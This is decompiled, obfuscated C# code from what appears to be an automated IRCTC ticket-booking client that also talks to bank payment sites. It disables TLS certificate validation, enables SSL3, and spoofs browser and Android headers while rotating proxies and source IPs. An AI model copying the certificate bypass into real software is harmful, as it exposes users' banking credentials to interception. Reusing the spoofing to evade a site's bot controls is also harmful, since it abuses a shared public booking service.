            int num = 0;
            int num2 = 0;
            bool flag = false;
            bool flag2 = bool_21;
            bool flag3 = bool_36;
            int num3 = (bool_29 ? 1 : 0);
            int num4 = (bool_38 ? 1 : 0);
            bool flag4 = bool_37;
            string text = "";
            if (!string.IsNullOrEmpty(string_71))
            {
                text = string_71;
            }
            if (string_87 == null)
            {
                string_87 = "";
            }
            if (flag2 && clsMain.bool_RedirectToBank)
            {
                string_90 = "Availability Already Received";
                return false;
            }
            int num5;
            while (true)
            {
                Stopwatch stopwatch = new Stopwatch();
                stopwatch.Start();
                string_90 = "";
                string_89 = "";
                webException_1 = null;
                num5 = 0;
                clsMain.Lock(string_21 + " Getting html in= " + string_86 + "\t Post:" + string_87);
                HttpWebResponse httpWebResponse = null;
                string text2 = "";
                int num6 = ((string_86.IndexOf("https://www.irctc.co.in", StringComparison.CurrentCultureIgnoreCase) == 0 || string_86.IndexOf("http://www.irctc.co.in", StringComparison.CurrentCultureIgnoreCase) == 0) ? 1 : 0);
                try
                {
                    if (string_86.Contains("paytm.in") || string_86.Contains("onlinesbi.com"))
                    {
                        ServicePointManager.Expect100Continue = false;
                    }
                    ServicePointManager.Expect100Continue = false;
                    HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(string_86);
                    httpWebRequest.ProtocolVersion = HttpVersion.Version11;
                    if (flag)
                    {
                        httpWebRequest.Proxy = clsMain.webProxy_0;
                        flag = false;
                    }
                    string_52 = "Tls12";
                    ServicePointManager.ServerCertificateValidationCallback = (object object_0, X509Certificate x509Certificate_0, X509Chain x509Chain_0, SslPolicyErrors sslPolicyErrors_0) => true;
                    new HttpRequestCachePolicy(HttpCacheAgeControl.MaxAge, TimeSpan.FromDays(0.0));
                    httpWebRequest.AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate;
                    httpWebRequest.ConnectionGroupName = clsMain.ConnectionGroupName_;
                    if ((string_52 == "Tls") | (string_52 == "Ssl3"))
                    {
                        ServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls;
                    }
                    else if (string_52 == "Tls12")
                    {
                        ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12;
                    }
                    if (int_28 > 0)
                    {
                        httpWebRequest.Timeout = int_28;
                    }
                    if (int_29 > 0)
                    {
                        httpWebRequest.ReadWriteTimeout = int_29;
                    }
                    byte[] bytes = Encoding.UTF8.GetBytes(string_87);
                    if (bool_63 && cookieContainer_2 == null)
                    {
                        cookieContainer_2 = new CookieContainer();
                    }
                    httpWebRequest.CookieContainer = cookieContainer_2;
                    bool flag5;
                    if (flag5 = string_87.Length > 0)
                    {
                        httpWebRequest.Method = "POST";
                    }
                    else if (bool_15)
                    {
                        httpWebRequest.Method = "POST";
                        bool_15 = false;
                    }
                    else
                    {
                        httpWebRequest.Method = "GET";
                    }
                    if (bool_40)
                    {
                        httpWebRequest.Method = "PUT";
                        bool_40 = false;
                    }
                    else if (bool_41)
                    {
                        httpWebRequest.Method = "DELETE";
                        bool_41 = false;
                    }
                    if (bool_42)
                    {
                        bool_42 = false;
                        httpWebRequest.Headers.Add("Cookie", string_13);
                    }
                    httpWebRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36";
                    httpWebRequest.Headers.Add("Origin", "https://secureonline.idbibank.com");
                    httpWebRequest.Headers.Add("sec-ch-ua-mobile", "?0");
                    httpWebRequest.Headers.Add("Cache-Control", "max-age=0");
                    httpWebRequest.Headers.Add("sec-ch-ua-platform", "\"Windows\"");
                    httpWebRequest.ContentType = "application/x-www-form-urlencoded";
                    httpWebRequest.Headers.Add("Sec-Fetch-User", "?1");
                    httpWebRequest.Headers.Add("Sec-Fetch-Dest", "document");
                    httpWebRequest.Headers.Add("Sec-Fetch-Site", "cross-site");
                    httpWebRequest.Headers.Add("Sec-Fetch-Mode", "navigate");
                    httpWebRequest.Headers.Add("sec-ch-ua", "\"Google Chrome\";v=\"95\", \"Chromium\";v=\"95\", \";Not A Brand\";v=\"99\"");
                    httpWebRequest.Headers.Add("Upgrade-Insecure-Requests", "1");
                    httpWebRequest.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9";
                    httpWebRequest.Headers.Add("Accept-Language", "en-US,en;q=0.9");
                    httpWebRequest.KeepAlive = true;
                    httpWebRequest.Connection = "keepalive";
                    httpWebRequest.Headers.Add("accept-encoding", "gzip, deflate");
                    httpWebRequest.ContentLength = bytes.Length;
                    if (bool_23)
                    {
                        httpWebRequest.ServicePoint.BindIPEndPointDelegate = method_76;
                    }
                    if (bool_30)
                    {
                        httpWebRequest.AllowAutoRedirect = false;
                        bool_30 = false;
                    }
                    else if (num6 != 0)
                    {
                        httpWebRequest.AllowAutoRedirect = false;
                        httpWebRequest.Headers.Add("X-Priority", "5");
                        httpWebRequest.Headers.Add("x-msg-priority", "9");
                    }
                    if (num3 != 0)
                    {
                        bool_29 = false;
                        httpWebRequest.ContentType = "application/json;charset=UTF-8";
                        httpWebRequest.Accept = "application/json, text/plain, */*";
                        httpWebRequest.Headers.Add("Accept-Language", "en-US,en;q=0.5");
                    }
                    if (bool_11)
                    {
                        httpWebRequest.AllowAutoRedirect = false;
                    }
                    if (num4 != 0)
                    {
                        httpWebRequest.ContentType = "application/json;charset=UTF-8";
                        httpWebRequest.UserAgent = "Dalvik/2.1.0 (Linux; U; Android 5.1; A1601 Build/LMY47I";
                        httpWebRequest.Accept = "";
                        bool_38 = false;
                    }
                    if (Boolean_0)
                    {
                        Boolean_0 = false;
                        ServicePointManager.Expect100Continue = true;
                    }
                    if (!string.IsNullOrEmpty(text))
                    {
                        string[] array = Strings.Split(text, "&");
                        int num7 = Information.UBound(array);
                        for (int i = 0; i <= num7; i++)
                        {
                            string[] array2 = Strings.Split(array[i], "=");
                            httpWebRequest.Headers.Set(array2[0], array2[1]);
                        }
                        string_71 = "";
                    }
                    if (!string.IsNullOrEmpty(string_88))
                    {
                        httpWebRequest.Referer = string_88;
                    }
                    if (flag5)
                    {
                        httpWebRequest.GetRequestStream().Write(bytes, 0, bytes.Length);
                    }
                    httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
                    if (num6 != 0 && (httpWebResponse.StatusCode == HttpStatusCode.Found || httpWebResponse.StatusCode == HttpStatusCode.MovedPermanently) && httpWebResponse.Headers["Location"].ToString().Contains("error") && num2 < 20)
                    {
                        Thread.Sleep(200);
                        num2++;
                        text2 = httpWebResponse.GetResponseHeader("Location");
                        httpWebResponse.Close();
                        httpWebResponse = null;
                        continue;
                    }
                    method_97(httpWebResponse, ref string_13);
                    if (bool_22)
                    {
                        dateTime_1 = DateTime.Parse(httpWebResponse.Headers["Date"]);
                    }
                    if (bool_11)
                    {
                        bool_11 = false;
                        string_16 = httpWebResponse.GetResponseHeader("Location");
                    }
                    if (bool_24)
                    {
                        string_29 = httpWebResponse.ResponseUri.ToString();
                    }
                    using (StreamReader streamReader = new StreamReader(httpWebResponse.GetResponseStream()))
                    {
                        if (bool_64)
                        {
                            text2 = streamReader.ReadToEnd();
                        }
                        else
                        {
                            httpWebRequest.Abort();
                        }
                    }
                    string_89 = text2;
                    num5 = 1;
                    stopwatch.Stop();
                    clsMain.Lock("Getting Html out= " + response);
                    break;
                }
                catch (WebException ex)
                {
                    num5 = 0;
                    webException_1 = ex;
                    string message = ex.Message;
                    bool flag6 = ex.Response != null;
                    string text3 = "";
                    num++;
                    HttpStatusCode httpStatusCode = HttpStatusCode.OK;
                    if (flag6)
                    {
                        httpStatusCode = ((HttpWebResponse)ex.Response).StatusCode;
                        try
                        {
                            text3 = ":" + new StreamReader(ex.Response.GetResponseStream()).ReadToEnd();
                        }
                        catch
                        {
                        }
                    }
                    string_90 = "<StatusCode>" + httpStatusCode.ToString() + "</StatusCode>\t<ErrorCode>" + message + "</ErrorCode>\t<ResponseCode>" + text3 + "</ResponseCode>";
                    clsMain.method_74("WebRequestPost WebEx=", string_90);
                    if (num >= 9)
                    {
                        break;
                    }
                    if (message.Contains("The remote name could not be resolved") | message.Contains("Unable to connect to the remote server"))
                    {
                        if (!message.ToUpper().Contains("SERVICEUNAVAILABLE"))
                        {
                            Thread.Sleep(1000);
                            break;
                        }
                        Thread.Sleep(2000);
                    }
                    else if (message.Contains("The underlying connection was closed:"))
                    {
                        if (!message.Contains("An unexpected error occurred on a send") && !message.Contains("A connection that was expected to be kept alive was closed by the server"))
                        {
                            message.Contains("An unexpected error occurred on a receive");
                        }
                        if (num % 2 == 0)
                        {
                            string_52 = "Tls12";
                        }
                        if (num == 3 || num == 4)
                        {
                            flag = true;
                        }
                        if (num >= 5)
                        {
                            break;
                        }
                    }
                    else if (message.Contains("The request was aborted: Could not create SSL/TLS secure channel."))
                    {
                        if (num % 2 == 0)
                        {
                            string_52 = "Tls12";
                        }
                        if (num == 3 || num == 4)
                        {
                            flag = true;
                        }
                        if (num >= 5)
                        {
                            break;
                        }
                    }
                    else if (message.Contains("The operation has timed out"))
                    {
                        if (num >= 5)
                        {
                            break;
                        }
                    }
                    else if (message.Contains("(406) Not Acceptable") || message.Contains("(401) Unauthorized") || message.Contains("(400) Bad Request") || (message.Contains("(404) Not Found") | message.Contains("(409) Conflict")) || (!message.Contains("(500) Internal Server Error") && !message.Contains("(502) Bad Gateway") && !message.Contains("(503) Server Unavailable") && !message.Contains("(504) Gateway Timeout")))
                    {
                        break;
                    }
                }
                catch (Exception ex2)
                {
                    num5 = 0;
                    string_90 = ex2.Message;
                    clsMain.method_74("WebRequestPost Ex=", string_90 + "  hitUrl" + string_86 + "  Inp=" + string_87 + " Ref=" + string_88 + " reHitCount=" + num);
                    if (num < 3 && string_90.Contains("String reference not set to an instance"))
                    {
                        string_90 = "";
                        num++;
                        continue;
                    }
                    break;
                }
                finally
                {
                    try
                    {
                        httpWebResponse?.Close();
                    }
                    catch
                    {
                    }
                }
            }
            return num5 != 0;
        }

        internal bool method_100(string string_86, string string_87, WebProxy webProxy_5, ref CookieContainer cookieContainer_2, bool bool_63, bool bool_64, int int_28, ref string string_88, ref bool bool_65, ref WebException webException_1, ref HttpStatusCode httpStatusCode_1, ref string string_89)
        {
            int num = 0;
            int num2;
            while (true)
            {
                string_89 = "";
                string_88 = "";
                webException_1 = null;
                bool_65 = false;
                num2 = 0;
                HttpWebResponse httpWebResponse = null;
                string text = "";
                try
                {
                    HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(string_86);
                    httpWebRequest.ProtocolVersion = HttpVersion.Version11;
                    httpWebRequest.AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate;
                    httpWebRequest.ConnectionGroupName = clsMain.ConnectionGroupName_;
                    if (int_28 > 0)
                    {
                        httpWebRequest.Timeout = int_28;
                        httpWebRequest.ReadWriteTimeout = int_28;
                    }
                    if (bool_63)
                    {
                        if (cookieContainer_2 == null)
                        {
                            cookieContainer_2 = new CookieContainer();
                        }
                        httpWebRequest.CookieContainer = cookieContainer_2;
                    }
                    httpWebRequest.Method = "GET";
                    httpWebRequest.Accept = "image/gif, */*";
                    httpWebRequest.KeepAlive = true;
                    httpWebRequest.ContentType = "application/x-www-form-urlencoded";
                    httpWebRequest.UserAgent = "Mozilla/5.0 (Windows T 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36";
                    httpWebRequest.Connection = "keepalive";
                    if (bool_30)
                    {
                        httpWebRequest.AllowAutoRedirect = false;
                    }
                    if (bool_23)
                    {
                        httpWebRequest.ServicePoint.BindIPEndPointDelegate = method_76;
                    }
                    if (string_86.Contains("UserLoginCaptcha.htm"))
                    {
                        httpWebRequest.Headers.Add("X-Requested-With", "XMLHttpRequest");
                    }
                    if (!string.IsNullOrEmpty(string_87))
                    {
                        httpWebRequest.Referer = string_87;
                    }
                    if (string_86 == "https://www.irctc.co.in/eticketing/protected/mapps1/logout")
                    {
                        if (!string.IsNullOrEmpty(class3_0._greq))
                        {
                            httpWebRequest.Headers.Add("greq", class3_0._greq);
                        }
                        if (!string.IsNullOrEmpty(class3_0.token))
                        {
                            httpWebRequest.Headers.Add("spa-csrf-token", class3_0.token);
                        }
                        if (!string.IsNullOrEmpty(class3_0._Authorization))
                        {
                            httpWebRequest.Headers.Add("Authorization", class3_0._Authorization);
                        }
                        httpWebRequest.Method = "POST";
                    }
                    httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
                    if (bool_22)
                    {
                        dateTime_1 = DateTime.Parse(httpWebResponse.Headers["Date"]);
                    }
                    using (StreamReader streamReader = new StreamReader(httpWebResponse.GetResponseStream()))
                    {
                        if (bool_64)
                        {
                            text = streamReader.ReadToEnd();
                        }
                        else
                        {
                            httpWebRequest.Abort();
                        }
                    }
                    string_88 = text;
                    num2 = 1;
                }
                catch (WebException ex)
                {
                    num2 = 0;
                    string_89 = ex.Message;
                    bool_65 = true;
                    webException_1 = ex;
                    if (ex.Response != null)
                    {
                        httpStatusCode_1 = ((HttpWebResponse)ex.Response).StatusCode;
                        string_89 = "StatusCode: " + httpStatusCode_1.ToString() + "\t" + string_89;
                    }
                    clsMain.method_74("WebRequestGet", string_89);
                }
                catch (Exception ex2)
                {
                    num2 = 0;
                    string_89 = ex2.Message;
                    clsMain.method_74("WebRequestGet", string_89);
                }
                finally
                {
                    try
                    {
                        httpWebResponse?.Close();
                    }
                    catch
                    {
                    }
                }
                if (num >= 3 || !string_89.ToUpper().Contains("CONNECTION WAS CLOSED"))
                {
                    break;
                }
                num++;
                clsMain.Lock("WebRequestPost Rehit = " + num);
            }
            return num2 != 0;
        }

        internal Bitmap method_101(string string_86, string string_87, WebProxy webProxy_5, ref CookieContainer cookieContainer_2, bool bool_63, int int_28, ref bool bool_64, ref WebException webException_1, ref string string_88, ref DateTime dateTime_7, ref int int_29)
        {
            int num = 0;
            string text = "Ssl3";
            while (true)
            {
                int_29 = 0;
                HttpWebResponse httpWebResponse = null;
                bool_64 = false;
                int num2 = 0;
                string_88 = "";
                int num3 = ((string_86.IndexOf("https://www.irctc.co.in", StringComparison.CurrentCultureIgnoreCase) == 0) ? 1 : 0);
                try
                {
                    HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(string_86);
                    ServicePointManager.DefaultConnectionLimit = 9999;
                    httpWebRequest.AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate;
                    httpWebRequest.ConnectionGroupName = clsMain.ConnectionGroupName_;
                    if ((text == "Tls") | (text == "Ssl3"))
                    {
                        ServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls;
                    }
                    else if (text == "Tls12")
                    {
                        ServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12;
                    }
                    httpWebRequest.ProtocolVersion = HttpVersion.Version11;
                    if (int_28 > 0)
                    {
                        httpWebRequest.Timeout = int_28;
                    }
                    if (bool_63)
                    {
                        if (cookieContainer_2 == null)
                        {
                            cookieContainer_2 = new CookieContainer();
                        }
                        httpWebRequest.CookieContainer = cookieContainer_2;
                    }
                    httpWebRequest.Method = "GET";
                    httpWebRequest.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9";
                    httpWebRequest.KeepAlive = true;
                    httpWebRequest.Connection = "keepalive";
                    httpWebRequest.UserAgent = "Mozilla/5.0 (Windows T 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36";
                    httpWebRequest.Headers.Add("Cache-Control", "max-age=0");
                    httpWebRequest.Headers.Add("Accept-Language", "en-US,en;q=0.9");
                    httpWebRequest.Headers.Add("Upgrade-Insecure-Requests", "1");
                    httpWebRequest.ConnectionGroupName = clsMain.ConnectionGroupName_;
                    if (num3 != 0)
                    {
                        httpWebRequest.AllowAutoRedirect = false;
                    }
                    if (bool_23)
                    {
                        httpWebRequest.ServicePoint.BindIPEndPointDelegate = method_76;
                    }
                    if (!string.IsNullOrEmpty(string_87))
                    {
                        httpWebRequest.Referer = string_87;
                    }
                    if (DateTime.Now.Hour >= 7 && DateTime.Now.Hour <= 11)
                    {
                        dateTime_7 = DateTime.Now.AddMilliseconds(500.0);
                        num2 = 1;
                    }
                    httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
                    if (num3 == 0 || (httpWebResponse.StatusCode != HttpStatusCode.Found && httpWebResponse.StatusCode != HttpStatusCode.MovedPermanently) || !httpWebResponse.Headers["Location"].ToString().Contains("errors.html") || num >= 10)
                    {
                        if (bool_22)
                        {
                            dateTime_1 = DateTime.Parse(httpWebResponse.Headers["Date"]);
                        }
                        Bitmap result;
                        if (num3 != 0)
                        {
                            MemoryStream memoryStream = new MemoryStream();
                            using (Stream stream = httpWebResponse.GetResponseStream())
                            {
                                byte[] array = new byte[4096];
                                int num4;
                                while ((num4 = stream.Read(array, 0, array.Length)) != 0)
                                {
                                    int_29 += num4;
                                    memoryStream.Write(array, 0, num4);
                                }
                            }
                            memoryStream.Flush();
                            result = new Bitmap(memoryStream);
                        }
                        else
                        {
                            result = new Bitmap(httpWebResponse.GetResponseStream());
                        }
                        if (num2 == 0 || dateTime_7 > DateTime.Now)
                        {
                            dateTime_7 = DateTime.Now;
                        }
                        httpWebResponse.Close();
                        if (int_29 < 200)
                        {
                            int_29 = 1500;
                        }
                        return result;
                    }
                    Thread.Sleep(200);
                    num++;
                    httpWebResponse.Close();
                    httpWebResponse = null;
                }
                catch (WebException ex)
                {
                    string_88 = ex.Message;
                    bool_64 = true;
                    webException_1 = ex;
                    if (!(string_88.Contains("The remote server returned an error: (403) Forbidden.") | string_88.Contains("The remote server returned an error: (412) Precondition Failed.") | string_88.Contains("The remote server returned an error: (429) Unknown") | string_88.Contains("internal server error")))
                    {
                        if (string_88.Contains("The remote name could not be resolved:") | string_88.Contains("Unable to connect to the remote server"))
                        {
                            return null;
                        }
                        if (!(string_88.Contains("(500) Internal Server Error") | string_88.Contains("(502) Bad Gateway")))
                        {
                            break;
                        }
                        num++;
                        if (num >= 2)
                        {
                            break;
                        }
                    }
                }
                catch (Exception ex2)
                {
                    string_88 = ex2.Message;
                    break;
                }
                finally
                {
                    try
                    {
                        httpWebResponse?.Close();
                    }
                    catch
                    {
                    }
                }
            }
            return null;
        }

        private IPEndPoint method_76(ServicePoint servicePoint_0, IPEndPoint ipendPoint_0, int int_28)
        {
            if (ipendPoint_0.AddressFamily == AddressFamily.InterNetworkV6)
            {
                return new IPEndPoint(clsMain.ipaddress_1, 0);
            }
            return new IPEndPoint(clsMain.ipaddress_0, 0);
        }

        private string method_96(HttpWebResponse httpWebResponse_0, ref string string_86)
        {
            string text = "";
            try
            {
                foreach (object cookie2 in httpWebResponse_0.Cookies)
                {
                    Cookie cookie = (Cookie)cookie2;
                    string text2 = cookie.Name + "=" + cookie.Value;
                    if (cookie.Name == string_86)
                    {
                        string_86 = cookie.Value;
                    }
                    text = text + text2 + "&&";
                }
                class3_0.string_72 = text;
                return text;
            }
            catch
            {
                return text;
            }
        }

        private string method_97(HttpWebResponse httpWebResponse_0, ref string string_86)
        {
            string text = "";
            try
            {
                foreach (object cookie2 in httpWebResponse_0.Cookies)
                {
                    Cookie cookie = (Cookie)cookie2;
                    string text2 = cookie.Name + "=" + cookie.Value;
                    if (cookie.Name == string_86)
                    {
                        string_86 = cookie.Value;
                    }
                    text = text + text2 + "&&";
                }
                class3_0.string_72 = text;
                string_86 = text;
                return text;
            }
            catch
            {
                return text;
            }
        }
    }
}
